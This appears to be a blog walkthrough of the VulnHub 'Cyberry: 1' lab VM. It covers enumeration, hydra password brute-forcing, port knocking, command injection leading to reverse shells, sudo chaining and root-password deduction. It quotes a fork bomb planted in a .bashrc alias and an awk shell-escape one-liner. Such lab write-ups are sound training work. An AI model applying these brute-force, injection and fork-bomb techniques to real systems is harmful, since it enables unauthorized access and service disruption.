---
layout: post
title: "I Love Berries!"
categories: walkthrough
tags: [vulnhub, cyberry]
comments: true
---

**Spoiler Alert**  
This post documents the complete walkthrough of Cyberry: 1, 
a boot2root [VM][1] hosted at [VulnHub][2]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background
Cyberry are eagerly anticipating the release of their new "Berrypedia" website, 
a life-long project which offers knowledge and insight into all things Berry!

### Information Gathering
Let's kick this off with a `nmap` scan to establish the services available in **cyberry**.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.128
...
PORT    STATE  SERVICE REASON         VERSION
21/tcp  open   ftp     syn-ack ttl 64 ProFTPD 1.3.5b
22/tcp  open   ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 97:7c:74:2b:f1:28:15:dc:8d:67:e0:75:75:44:e9:ad (RSA)
|_  256 29:62:8e:10:9b:97:79:3a:18:e6:c0:0b:f7:ec:f8:ee (ECDSA)
80/tcp  open   http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Coming Soon
666/tcp closed doom    reset ttl 64
```

Let's start with the web service first.

### Directory/File Enumeration

Let's enumerate the common directories and files with `gobuster`.

```
Gobuster v1.1 OJ Reeves (@TheColonial)
=====================================================
[+] Mode : dir
[+] Url/Domain : http://192.168.198.128/
[+] Threads : 10
[+] Wordlist : /usr/share/seclists/Discovery/Web_Content/common.txt
[+] Status codes : 307,200,204,301,302
[+] Expanded : true
=====================================================
http://192.168.198.128/.bashrc (Status: 200)
http://192.168.198.128/css (Status: 301)
http://192.168.198.128/images (Status: 301)
http://192.168.198.128/index.html (Status: 200)
http://192.168.198.128/javascript (Status: 301)
http://192.168.198.128/phpmyadmin (Status: 301)
=====================================================
```

### A fork bomb in `.bashrc`

There was something sinister lurking in `.bashrc`  

`alias ls='echo "Cyberry Intrusion Detection activated\nsystem failsafe mode will begin in:"; sleep 1; echo "5"; sleep 1; echo "4"; sleep 1; echo "3"; sleep 1; echo "2"; sleep 1; echo "1"; sleep 1; :(){ :|: & };:`

A fork bomb!

### HTML Comments

There were several HTML comments in the source code encoded in `base64`.

![comments.png](/assets/images/posts/cyberry-walkthrough/cyberry-1.png)

Decoding the above strings revealed the following.

```
# curl -s 192.168.198.128 | sed -n '/<!--/,/-->/p' | tr -cd 'a-zA-Z0-9=\n' > base64.txt
$ for b in $(cat base64.txt); do (echo $b | base64 -d && echo); done
nice try!
nothing to see here!
time to move on!
secretfile.html
work-in-progress.png
```

Requesting for `/secretfile.html` resulted in.

```
# curl -i 192.168.198.128/secretfile.html
HTTP/1.1 200 OK
Date: Mon, 22 Jan 2018 15:09:17 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Thu, 23 Nov 2017 22:05:33 GMT
ETag: "f4-55eada29aaddf"
Accept-Ranges: bytes
Content-Length: 244
Vary: Accept-Encoding
Content-Type: text/html

<html>
<head>
<body>
<p><b>Congratulations... you must be an uberhacker!</b></p>
<br />
<br />
<p>Can you progress any further?? </p>
<br />
<br />

<p>01100010 01101111 01110011 01110011 00101110 01100111 01101001 01100110</p>
</body>
</html>
```

The binary string was decoded to the following.

```bash
# for b in 01100010 01101111 01110011 01110011 00101110 01100111 01101001 01100110; do printf "%02x" $((2#$b)); done | xxd -p -r && echo
boss.gif
```
`¯\_(ツ)_/¯`

![boss.gif](/assets/images/posts/cyberry-walkthrough/boss.gif)

Requesting for `/work-in-progress.png` resulted in.

```
# curl -i 192.168.198.128/work-in-progress.png
HTTP/1.1 200 OK
Date: Mon, 22 Jan 2018 15:11:43 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Thu, 23 Nov 2017 22:36:20 GMT
ETag: "7-55eae10af2388"
Accept-Ranges: bytes
Content-Length: 7
Content-Type: image/png

edocrq
```

_Note that the reverse of "edocrq" is "qrcode"._

Well, in any case, the file `edocrq` was available from the web server and it looked like this.

![edocrq.png](/assets/images/posts/cyberry-walkthrough/edocrq.png)

There is a slight twist before the QR code can be decoded. You need to flip it horizontally like so.

![qrcode.png](/assets/images/posts/cyberry-walkthrough/qrcode.png)

It was decoded to `/berrypedia.html`.

### Directory/File Enumeration (2)

The same conclusion can also be reached with `dirbuster` without going through the hard way.

```
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: /images/ - 200
Dir found: / - 200
File found: /welcome.php - 302
Dir found: /coming-soon-files/ - 200
Dir found: /icons/ - 403
File found: /coming-soon-files/jquery_002.js - 200
Dir found: /css/ - 200
File found: /coming-soon-files/jquery.js - 200
File found: /coming-soon-files/a.html - 200
File found: /logout.php - 302
Dir found: /javascript/ - 403
Dir found: /coming-soon-files/a_data/ - 200
File found: /css/style.css - 200
File found: /coming-soon-files/css.css - 200
File found: /coming-soon-files/font-awesome.css - 200
File found: /config.php - 200
File found: /coming-soon-files/style.css - 200
File found: /coming-soon-files/a_data/inject.css - 200
File found: /login.php - 200
File found: /register.php - 200
File found: /berrypedia.html - 200
Dir found: /phpmyadmin/ - 200
Dir found: /server-status/ - 403
DirBuster Stopped
```

### Login Page `/login.php`

The login page had a weakness - it leaked information about the existence of a user.

_If the user does not exist_

![non-exist.png](/assets/images/posts/cyberry-walkthrough/cyberry-5.png)

_If the user exists and the password is invalid_

![exist.png](/assets/images/posts/cyberry-walkthrough/cyberry-6.png)

With this in mind, I was able to perform online password cracking with `hydra`.

```
# hydra -l root -P /usr/share/wordlists/rockyou.txt -f -e sr 192.168.198.128 http-post-form "/login.php:username=^USER^&password=^PASS^:not valid"
[80][http-post-form] host: 192.168.198.128 login: root password: password
```

### Berrypedia Admin Panel

Unfortunately, this is not the SSH password for `root`. I was able to login to the admin panel but there was nothing interesting to see really.

![panel.png](/assets/images/posts/cyberry-walkthrough/cyberry-7.png)

### phpMyAdmin 4.6.6

PMA was present as well, which is another way of saying the machine is capable of running PHP.

![pma.png](/assets/images/posts/cyberry-walkthrough/cyberry-2_2.png)

### Berrypedia

Requesting for `/berrypedia.html` revealed the following page:

![berrypedia.png](/assets/images/posts/cyberry-walkthrough/cyberry-8.png)

Elderberry was a hyperlink to an interesting file - `/placeho1der.jpg`:

![placeho1der.jpg](/assets/images/posts/cyberry-walkthrough/placeho1der.jpg)

### Solving the puzzle of `/placeho1der.jpg`

The image required some transformation before the puzzle can be revealed:

* Flip vertical
* Invert colors

![puzzle.jpg](/assets/images/posts/cyberry-walkthrough/puzzle.jpg)

<ol start='0'>
    <li>Port of Tacoma</li>
    <li>Smiley Lewis (1955)</li>
    <li>Dave Edmund (1970)</li>
    <li>Gale Storm (1955)</li>
    <li>Fats Domino (1961)</li>
</ol>

The photo of each person was intentionally flipped to throw you off when you are searching in Google Images.

The common denominator that linked each person was the song "_I Hear You Knocking_". Each of them had covered the song at some point in time. Combined with Port of Tacoma, it was very obvious that we are looking at port knocking here.

Port knocking required connecting to a sequence of ports in the correct order before certain port(s) are revealed. The year which the song was covered by each person makes it a good starting point to guess the correct port sequence.

### Unlocking `61955/tcp`

I wrote this port knocking script using `nmap`.

```bash
# cat knock.sh
#!/bin/sh

TARGET=$1

for ports in $(cat sequence.txt); do
    echo "[*] Trying sequence $ports..."
    for p in $(echo $ports | tr ',' ' '); do
        nmap -n -v0 -Pn --max-retries 0 -p $p $TARGET --send-ip
    done
    sleep 3
    nmap -n -v -Pn -p- -A --reason $TARGET -oN ${ports}.txt --send-ip
done
```

`sequence.txt` contained all the unique sequences of 1955, 1955, 1961 and 1970 and it can be generated like so.

```bash
# python -c 'import itertools; print list(itertools.permutations([1955,1955,1961,1970]))' | sed 's/), /\n/g' | tr -cd '0-9,\n' | sort | uniq
1955,1955,1961,1970
1955,1955,1970,1961
1955,1961,1955,1970
1955,1961,1970,1955
1955,1970,1955,1961
1955,1970,1961,1955
1961,1955,1955,1970
1961,1955,1970,1955
1961,1970,1955,1955
1970,1955,1955,1961
1970,1955,1961,1955
1970,1961,1955,1955
```

Upon reaching sequence `1970,1955,1955,1961`, the port `61955/tcp` was unlocked like so.

```
61955/tcp open   http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Coming Soon
```

Another similar site appeared to be running at `61955/tcp`.

![reloaded.png](/assets/images/posts/cyberry-walkthrough/cyberry-3.png)

Let's repeat another round of directory enumeration with `gobuster` on this site.

```
Gobuster v1.1 OJ Reeves (@TheColonial)
=====================================================
[+] Mode : dir
[+] Url/Domain : http://192.168.198.128:61955/
[+] Threads : 10
[+] Wordlist : /usr/share/seclists/Discovery/Web_Content/common.txt
[+] Status codes : 200,204,301,302,307
[+] Expanded : true
=====================================================
http://192.168.198.128:61955/H (Status: 200)
http://192.168.198.128:61955/css (Status: 301)
http://192.168.198.128:61955/image (Status: 301)
http://192.168.198.128:61955/images (Status: 301)
http://192.168.198.128:61955/index.html (Status: 200)
http://192.168.198.128:61955/javascript (Status: 301)
http://192.168.198.128:61955/js (Status: 301)
http://192.168.198.128:61955/phpmyadmin (Status: 301)
=====================================================
```

Requesting for `http://192.168.198.128:61955/H` revealed something interesting.

```
# curl 192.168.198.128:61955/H
++++++++++[>+++++++>++++++++++>+++>+<<<<-]>++.>+.+++++++..+++.>++.<<+++++++++++++++.>.+++.------.--------.>+.>.
///////////////////////////////////////////////////////////////////////////////////////////////////////////////



--------[-->+++<]>.+++[->+++<]>.----.++++++++++++.[->+++++<]>-.+[----->+<]>.--------.++++++++.-----------.+++.+++++++++++++.+.

--[----->+<]>---.+++++.[--->+<]>---.+[->+++<]>+.++++++++.

+[----->+++<]>+.-------.+++++++++++..-------.

+[------->++<]>.-----.------.++++++++.

--------[-->+++<]>.+++[->+++<]>.+++++++++++++..+++++++.

+[------->++<]>-.------------.--[--->+<]>---.+++++++.

+[----->+++<]>++++.------.+++++++++++++..+++++++.

+[------->++<]>++.+++++++.-[-->+<]>-.[-->+<]>+++.[->+++<]>++.-.++++++++++.------.++++++++++.---------..
```

### Brainfuck

Despite its strange looking form, the code above was written in the esoteric [Brainfuck][3] language. Using an online [interpreter][4], it was deciphered to the following.

```
Hello World!
team members
chuck
halle
nick
terry
mary
kerry
pw: bakeoff
```

OK. I have the team members' names and a password but to whom does the password belong to? This can be verified very easily using `hydra`.

```
# hydra -L members.txt -p bakeoff -f ftp://192.168.198.128
[21][ftp] host: 192.168.198.128 login: mary password: bakeoff
```
```
# hydra -L members.txt -p bakeoff -f ssh://192.168.198.128
[22][ssh] host: 192.168.198.128 login: mary password: bakeoff
```

Too bad `mary` did not have a shell. Let's see what we can discover from FTP instead.

### FTP Access

![ftp.png](/assets/images/posts/cyberry-walkthrough/cyberry-9.png)

Noticed that `.bash_history` is a directory? This is unusual and definitely worth taking a closer look.

![.bash_history.png](/assets/images/posts/cyberry-walkthrough/cyberry-10.png)

`.reminder.enc` is a ciphertext encrypted using `openssl enc` (`Salted__` header) while `.trash` is a list of common passwords.

```
# cat .trash
Most common passwords 2017 (Top 10)

123456
123456789
qwerty
12345678
111111
1234567890
1234567
password
123123
987654321
```

### Decryption of `.reminder.enc`

It made sense to use the passwords above to decrypt the file but I wouldn't know which cipher was used. To that end, I wrote this `bash` script to try all available ciphers until something clicks.

```bash
# cat decrypt.sh
#!/bin/bash

FILE=.reminder.enc

for c in $(cat ciphers.txt); do
    for pw in $(sed -n 3,12p .trash); do
        openssl enc $c -d -salt -in $FILE -pass pass:$pw -out /dev/null &>/dev/null
        if [ $? -eq 0 ]; then
            dec=$(openssl enc $c -d -salt -in $FILE -pass pass:$pw | tr -cd '[:print:]')
            if [ $? -eq 0 ]; then
                echo "[*] Trying $c with $pw"
                printf "%s\n" $dec
                break
            fi
        fi
    done
done
```

`ciphers.txt` contained the available ciphers. Running the script revealed the following.

![decrypted.png](/assets/images/posts/cyberry-walkthrough/cyberry-2.png)

It certainly looked like some sort of password!

### Login page `/login.php` (2)

Recall from above the site has a login page to the Berrypedia Admin Panel? Well, this site has a login page as well.

![login.php.png](/assets/images/posts/cyberry-walkthrough/cyberry-11.png)

Let's try and go with `(mary:dangleberry69)` and see what we get.

![secure.png](/assets/images/posts/cyberry-walkthrough/cyberry-12.png)

### Secure Section

In the secure section, there was a page that appeared to be performing `nslookup` and the `host` parameter has 2 pre-defined values: **google.com** and **yahoo.com** as shown below.

![nslookup.png](/assets/images/posts/cyberry-walkthrough/cyberry-13.png)

Let's see if we can exploit the `host` parameter to execute remote commands.

![remote-command.png](/assets/images/posts/cyberry-walkthrough/cyberry-14.png)

Bingo! Using this way, I was able to run a reverse shell using `nc` back to me.

![nc.png](/assets/images/posts/cyberry-walkthrough/cyberry-15.png)

![reverse-shell.png](/assets/images/posts/cyberry-walkthrough/cyberry-16.png)

Awesome.

### Learning the `root` dance

During enumeration, I spotted an interesting file at `/var/www/html-secure/ub3r-s3cur3`

![secure.png](/assets/images/posts/cyberry-walkthrough/cyberry-17.png)

It was a list of Latin words. Perhaps this is another password list that be used to brute force SSH?

```
hydra -L members.txt -P nb-latin -f ssh://192.168.198.128
[22][ssh] host: 192.168.198.128 login: nick password: custodio
```

### Unstacking the `sudo` Russian doll

I was able to SSH in to `nick`'s account using the credentials `(nick:custodio)` and here's where the crazy `sudo` Russian doll fun begins.

![nick.png](/assets/images/posts/cyberry-walkthrough/cyberry-19.png)

It appeared that `/home/nick/invoke.sh` is a script that runs any executable as `terry`.

![invoke.png](/assets/images/posts/cyberry-walkthrough/cyberry-20.png)

Let's try to open a shell as `terry`. But before we do that, recall that a `fork()` bomb was present in `.bashrc`? One of the users may have this as a defense mechanism when `/bin/bash` is their shell. It's better to use good old `/bin/sh` instead. It ain't pretty but it works.

![terry.png](/assets/images/posts/cyberry-walkthrough/cyberry-21.png)

`awk` can be used to escape to shell like so.
```awk
awk 'BEGIN { system("/bin/sh") }'
```

![halle.png](/assets/images/posts/cyberry-walkthrough/cyberry-22.png)

PHP can run shell commands too. Let's run a reverse shell back to me using `nc`.

![nc.png](/assets/images/posts/cyberry-walkthrough/cyberry-23.png)

On my `netcat` listener, a reverse shell connects.

![terry.png](/assets/images/posts/cyberry-walkthrough/cyberry-24.png)

Let's spawn a pseudo-tty.

![pty.png](/assets/images/posts/cyberry-walkthrough/cyberry-25.png)

The buck finally stops here.

![stop.png](/assets/images/posts/cyberry-walkthrough/cyberry-26.png)

However, at the home directory of `chuck` there was still something interesting to look out for.

![deleted.png](/assets/images/posts/cyberry-walkthrough/cyberry-27.png)

The file at `/home/chuck/.deleted/deleted` provided hints to the `root` password!

### Guessing the `root` password

Here's what we know about the `root` password.

```
The password starts with "che" and ends with "rry"

letter e is used three times
letter c is used twice
letter r is used twice
letter b is used twice
letter a is used twice

The only other letters in the password were h,w,m & y

It's a concatenated 4-word password

There's a 99% chance one of the words is a latin word: baca
```

I know the first 3 characters of the first word and the last 3 characters of the last word. In between the first and last word are the Latin word "baca" and another unknown word.

The first word must contain the following:

* "che" at the beginning; and
* one "b" (another "b" is in "baca"); or
* one "m"; or
* one "w"

I used the following command to find the first word by eliminating the characters that should be not appear and it must be a word in a dictionary.

```bash
# for word in $(grep -E '^che' /usr/share/dict/words | tr -cd 'chebmw\n' | sort | uniq | tr '\n' ' '); do grep -Eo "^$word$" /usr/share/dict/words; done
chew
```

The last word must contain the following:

* one "b" (another "b" is in "baca"); or
* at least one "e" (another "e" is in "che"); or
* one "m"; and
* "rry" at the end


Similarly, finding the last word and meeting the above constraints.

```bash
# for word in $(grep -E 'rry$' /usr/share/dict/words | tr -cd 'bemrry\n' | sort | uniq | tr '\n' ' '); do grep -Eo "^$word$" /usr/share/dict/words; done
berry
merry
```

It is now trivial to find the remaining word. When the last word is "berry" the remaining word has to be "me" in order to satisfy the constraints. Conversely, when the last word is "merry" the remaining word has to be "be".

Armed with this information, there are only 4 possible outcomes that meet all the constraints.

```
chewbacameberry
chewmebacaberry
chewbacabemerry
chewbebacamerry
```
One of the above got to be the `root` password. Using `hydra`, verifying the password is simple.

```
# hydra -l root -P passwords.txt -f ssh://192.168.198.128
[22][ssh] host: 192.168.198.128 login: root password: chewbacabemerry
```

### I know the `root` dance!

![root-dance.png](/assets/images/posts/cyberry-walkthrough/cyberry-18.png)

:dancer:

[1]: https://www.vulnhub.com/entry/cyberry-1,217/
[2]: https://www.vulnhub.com
[3]: https://en.wikipedia.org/wiki/Brainfuck
[4]: https://copy.sh/brainfuck/
